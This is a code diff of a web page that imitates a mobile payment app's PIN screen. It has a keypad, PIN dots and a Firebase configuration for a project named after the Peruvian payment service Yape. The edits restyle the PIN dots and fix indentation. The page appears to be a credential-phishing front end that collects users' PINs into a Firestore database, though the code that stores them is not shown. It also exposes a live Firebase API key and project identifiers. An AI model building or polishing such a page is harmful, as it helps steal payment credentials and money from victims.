@@ -33,10 +33,15 @@
     .form-section { background-color: white; color: #6a0dad; width: 100%; border-radius: 24px 24px 0 0; padding: 40px 0; margin-top: 30px; text-align: center; }
     .title { font-size: 20px; margin-bottom: 25px; }
 
-    /* Puntos PIN */
+    /* Puntos PIN (adaptados) */
     .dots { display: flex; justify-content: center; margin-bottom: 30px; gap: 16px; }
-    .dot { width: 16px; height: 16px; border-radius: 50%; background-color: #6a0dad; visibility: hidden; }
-    .dot.active { visibility: visible; }
+    .dot { 
+      width: 16px; height: 16px; 
+      border-radius: 50%; 
+      border: 2px solid #6a0dad;   /* círculo vacío visible */
+      background-color: transparent; 
+    }
+    .dot.active { background-color: #6a0dad; } /* se rellena cuando escribes */
 
     /* Teclado */
     .keypad { display: grid; grid-template-columns: repeat(3, 80px); gap: 15px; justify-content: center; }
@@ -97,20 +102,19 @@
 
     const firebaseConfig = {
       apiKey: "AIzaSyCHzOEwhFHQo9boQjRLLu18XJNFKXQU06A",
-    authDomain: "yape-5f8d6.firebaseapp.com",
-    projectId: "yape-5f8d6",
-    storageBucket: "yape-5f8d6.firebasestorage.app",
-    messagingSenderId: "609053449523",
-    appId: "1:609053449523:web:80a334f896f2fba834b246",
-    measurementId: "G-TNYNH4G14G"
-  };
+      authDomain: "yape-5f8d6.firebaseapp.com",
+      projectId: "yape-5f8d6",
+      storageBucket: "yape-5f8d6.firebasestorage.app",
+      messagingSenderId: "609053449523",
+      appId: "1:609053449523:web:80a334f896f2fba834b246",
+      measurementId: "G-TNYNH4G14G"
+    };
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
     const auth = getAuth(app);
 
     const input = document.getElementById("clave");
-    const dots = document.getElementById("dots-container");
     const modal = document.getElementById("modal");
     const modalContent = document.getElementById("modal-content");
     const keypad = document.getElementById("keypad");
@@ -209,4 +213,4 @@
     generateKeypad();
   </script>
 </body>
-  </html>
+      </html>
